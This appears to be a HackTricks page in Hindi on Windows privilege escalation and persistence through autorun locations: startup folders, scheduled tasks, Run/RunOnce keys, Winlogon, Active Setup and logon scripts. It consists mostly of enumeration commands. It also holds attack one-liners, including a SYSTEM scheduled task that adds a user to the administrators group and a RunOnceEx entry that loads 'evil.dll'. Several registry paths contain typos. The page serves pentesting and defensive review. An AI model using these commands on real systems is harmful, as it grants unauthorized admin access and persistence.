# Autoruns के साथ Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** का उपयोग **startup** पर programs चलाने के लिए किया जा सकता है। देखें कि **startup** पर चलने के लिए कौन-से binaries programmed हैं:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Scheduled Tasks

**Tasks** को **specific frequency** पर चलने के लिए schedule किया जा सकता है। यह देखने के लिए कि कौन-से binaries चलने के लिए scheduled हैं, निम्न commands का उपयोग करें:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtasks.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## फ़ोल्डर

**Startup folders** में स्थित सभी binaries **startup पर execute** होने वाले हैं। सामान्य startup folders वे हैं जो नीचे सूचीबद्ध हैं, लेकिन startup folder registry में indicated होता है। [यहाँ पढ़ें कि कहाँ।](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
> **FYI**: Archive extraction *path traversal* vulnerabilities (जैसे 7.13 से पहले के WinRAR में दुरुपयोग की गई vulnerability – CVE-2025-8088) का उपयोग **decompression के दौरान payloads को सीधे इन Startup folders में रखने** के लिए किया जा सकता है, जिसके परिणामस्वरूप अगले user logon पर code execution होता है। इस technique के गहन विश्लेषण के लिए देखें:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## रजिस्ट्री

> [!TIP]
> [यहाँ से नोट](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): **Wow6432Node** registry entry यह दर्शाती है कि आप 64-bit Windows version चला रहे हैं। Operating system इस key का उपयोग 64-bit Windows versions पर चलने वाले 32-bit applications के लिए HKEY_LOCAL_MACHINE\SOFTWARE का अलग view दिखाने हेतु करता है।

### Runs

**आमतौर पर ज्ञात** AutoRun registry:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

**Run** और **RunOnce** के नाम से जानी जाने वाली registry keys इस तरह बनाई गई हैं कि user के system में log in करने पर हर बार programs अपने आप execute हों। Key के data value के रूप में assigned command line 260 characters या उससे कम तक सीमित होती है।<sup>[[2]](#references)</sup>

**Service runs** (boot के दौरान services के automatic startup को नियंत्रित कर सकते हैं):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Windows Vista और उसके बाद के versions में **Run** और **RunOnce** registry keys अपने आप generate नहीं होतीं। इन keys की entries या तो सीधे programs start कर सकती हैं या उन्हें dependencies के रूप में निर्दिष्ट कर सकती हैं। उदाहरण के लिए, logon पर DLL file load करने के लिए, "Depend" key के साथ **RunOnceEx** registry key का उपयोग किया जा सकता है। यह system start-up के दौरान "C:\temp\evil.dll" execute करने के लिए registry entry जोड़कर प्रदर्शित किया गया है:<sup>[[2]](#references)</sup>
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!TIP]
> **Exploit 1**: यदि आप **HKLM** के अंदर उल्लिखित किसी भी registry में write कर सकते हैं, तो किसी अलग user के login करने पर आप privileges escalate कर सकते हैं।

> [!TIP]
> **Exploit 2**: यदि आप **HKLM** के अंदर किसी भी registry में निर्दिष्ट binaries को overwrite कर सकते हैं, तो किसी अलग user के login करने पर आप उस binary को backdoor के साथ modify करके privileges escalate कर सकते हैं।
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startup Path

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

**Startup** folder में रखे गए Shortcuts user logon या system reboot के दौरान services या applications को launch करने के लिए स्वचालित रूप से trigger होंगे। **Startup** folder का स्थान registry में **Local Machine** और **Current User** दोनों scopes के लिए परिभाषित होता है। इसका अर्थ है कि इन निर्दिष्ट **Startup** locations में जोड़ा गया कोई भी shortcut यह सुनिश्चित करेगा कि logon या reboot process के बाद linked service या program startup हो जाए, जिससे programs को स्वचालित रूप से चलाने के लिए schedule करना एक सरल तरीका बन जाता है।<sup>[[1]](#references)[[2]](#references)</sup>

> [!TIP]
> यदि आप **HKLM** के अंतर्गत किसी भी \[User] Shell Folder को overwrite कर सकते हैं, तो आप उसे अपने नियंत्रण वाले folder की ओर point कर सकेंगे और एक backdoor रख सकेंगे, जिसे system में किसी user के log in करने पर हर बार execute किया जाएगा और privileges escalate होंगे।
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

यह per-user registry value किसी script या command की ओर point कर सकती है, जिसे उस user के log on करने पर execute किया जाता है। यह मुख्य रूप से **persistence** primitive है, क्योंकि यह केवल प्रभावित user के context में run होती है, लेकिन post-exploitation और autoruns reviews के दौरान इसे check करना फिर भी उपयोगी है।<sup>[[3]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> यदि आप current user के लिए इस value में write कर सकते हैं, तो admin rights की आवश्यकता के बिना अगले interactive logon पर execution को फिर से trigger कर सकते हैं। यदि आप इसे किसी अन्य user hive के लिए write कर सकते हैं, तो उस user के log on करने पर code execution प्राप्त कर सकते हैं।
```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```
नोट्स:

- `.bat`, `.cmd`, `.ps1` या target user द्वारा पहले से readable अन्य launcher files के लिए full paths को प्राथमिकता दें।
- यह value हटाए जाने तक logoff/reboot के बाद भी बना रहता है।
- `HKLM\...\Run` के विपरीत, यह अपने-आप elevation प्रदान **नहीं** करता; यह user-scope persistence है।

### Winlogon Keys

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

आमतौर पर, **Userinit** key को **userinit.exe** पर सेट किया जाता है। हालांकि, यदि इस key को modify किया जाता है, तो निर्दिष्ट executable को user logon के दौरान **Winlogon** द्वारा launch किया जाएगा। इसी प्रकार, **Shell** key का उद्देश्य **explorer.exe** की ओर point करना है, जो Windows का default shell है।<sup>[[1]](#references)</sup>
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!TIP]
> यदि आप registry value या binary को overwrite कर सकते हैं, तो आप privileges escalate कर पाएंगे।

### Policy Settings

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

**Run** key को check करें।
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Safe Mode Command Prompt बदलना

Windows Registry में `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot` के अंतर्गत, डिफ़ॉल्ट रूप से `cmd.exe` पर सेट एक **`AlternateShell`** value होती है। इसका अर्थ है कि startup के दौरान जब आप "Safe Mode with Command Prompt" चुनते हैं (F8 दबाकर), तो `cmd.exe` का उपयोग किया जाता है। लेकिन, आप अपने computer को F8 दबाकर इसे manually चुनने की आवश्यकता के बिना, automatically इस mode में start होने के लिए configure कर सकते हैं।

"Safe Mode with Command Prompt" में automatically start होने के लिए boot option बनाने के steps:<sup>[[5]](#references)</sup>

1. `boot.ini` file के attributes बदलकर read-only, system और hidden flags हटाएँ: `attrib c:\boot.ini -r -s -h`
2. `boot.ini` को editing के लिए खोलें।
3. इस तरह की एक line insert करें: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. `boot.ini` में changes save करें।
5. Original file attributes फिर से लागू करें: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** **AlternateShell** registry key बदलने से custom command shell setup किया जा सकता है, जिसका उपयोग potentially unauthorized access के लिए हो सकता है।
- **Exploit 2 (PATH Write Permissions):** System **PATH** variable के किसी भी हिस्से पर write permissions होना, विशेष रूप से `C:\Windows\system32` से पहले, आपको एक custom `cmd.exe` execute करने देता है, जो system के Safe Mode में start होने पर backdoor हो सकता है।
- **Exploit 3 (PATH and boot.ini Write Permissions):** `boot.ini` पर write access होने से automatic Safe Mode startup enable किया जा सकता है, जिससे अगले reboot पर unauthorized access आसान हो जाता है।

Current **AlternateShell** setting जाँचने के लिए, इन commands का उपयोग करें:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Installed Component

Active Setup Windows का एक feature है जो **desktop environment पूरी तरह load होने से पहले शुरू होता है**। यह कुछ commands के execution को प्राथमिकता देता है, जिन्हें user logon आगे बढ़ने से पहले पूरा होना आवश्यक है। यह process Run या RunOnce registry sections जैसी अन्य startup entries trigger होने से भी पहले होता है।

Active Setup निम्नलिखित registry keys के माध्यम से managed होता है:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

इन keys के भीतर विभिन्न subkeys मौजूद होते हैं, जिनमें से प्रत्येक एक specific component से संबंधित होता है। विशेष रुचि वाली key values में शामिल हैं:

- **IsInstalled:**
- `0` दर्शाता है कि component का command execute नहीं होगा।
- `1` का अर्थ है कि command प्रत्येक user के लिए एक बार execute होगा। यदि `IsInstalled` value missing हो, तो यही default behavior होता है।
- **StubPath:** Active Setup द्वारा execute किए जाने वाले command को define करता है। यह कोई भी valid command line हो सकती है, जैसे `notepad` launch करना।

**Security Insights:**

- ऐसी key को modify या उसमें write करना, जहाँ **`IsInstalled`** `"1"` पर set हो और specific **`StubPath`** मौजूद हो, unauthorized command execution का कारण बन सकता है और संभावित रूप से privilege escalation में उपयोग हो सकता है।
- किसी भी **`StubPath`** value में referenced binary file को alter करने से भी privilege escalation हो सकता है, यदि पर्याप्त permissions प्राप्त हों।

सभी Active Setup components में **`StubPath`** configurations inspect करने के लिए, इन commands का उपयोग किया जा सकता है:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Browser Helper Objects (BHOs) का Overview

Browser Helper Objects (BHOs) DLL modules होते हैं, जो Microsoft's Internet Explorer में अतिरिक्त features जोड़ते हैं। ये प्रत्येक बार start होने पर Internet Explorer और Windows Explorer में load होते हैं। हालांकि, **NoExplorer** key को 1 पर set करके इनके execution को block किया जा सकता है, जिससे ये Windows Explorer instances के साथ load नहीं होते।<sup>[[1]](#references)</sup>

BHOs, Internet Explorer 11 के माध्यम से Windows 10 के compatible हैं, लेकिन Microsoft Edge में supported नहीं हैं, जो Windows के नए versions में default browser है।

किसी system पर registered BHOs को explore करने के लिए, आप निम्नलिखित registry keys inspect कर सकते हैं:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Registry में प्रत्येक BHO को उसके **CLSID** द्वारा represent किया जाता है, जो एक unique identifier के रूप में कार्य करता है। प्रत्येक CLSID की detailed information `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` के अंतर्गत मिल सकती है।

Registry में BHOs को query करने के लिए, इन commands का उपयोग किया जा सकता है:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet Explorer Extensions

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

ध्यान दें कि registry में प्रत्येक dll के लिए 1 नई registry entry होगी और इसे **CLSID** द्वारा दर्शाया जाएगा। आप `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` में CLSID की जानकारी पा सकते हैं।

### Font Drivers

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Open Command

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Image File Execution Options
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

ध्यान दें कि autoruns मिलने वाली सभी साइट्स को **पहले ही**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe) द्वारा **search किया जा चुका है**। हालांकि, **auto-executed** फ़ाइलों की अधिक व्यापक सूची के लिए आप systinternals से [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) का उपयोग कर सकते हैं:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## अधिक

**[https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2) में registries जैसे अधिक Autoruns खोजें**<sup>[[4]](#references)</sup>

## References

- [1] [सामान्य malware persistence mechanisms](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [2] [MITRE ATT&CK T1547.001 – Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)
- [3] [MITRE ATT&CK T1037.001 – Boot or Logon Initialization Scripts: Logon Script (Windows)](https://attack.mitre.org/techniques/T1037/001/)
- [4] [Autoruns – Autostart categories (Troubleshooting with the Windows Sysinternals Tools, 2nd Edition)](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [5] [मैं alternate shell शुरू करने वाला boot option कैसे जोड़ सकता हूं?](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [6] [Metasploit Wrap-Up 04/03/2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)
- [7] [Metasploit PR #21032 – windows/persistence/userinit_mpr_logon_script](https://github.com/rapid7/metasploit-framework/pull/21032)
{{#include ../../banners/hacktricks-training.md}}
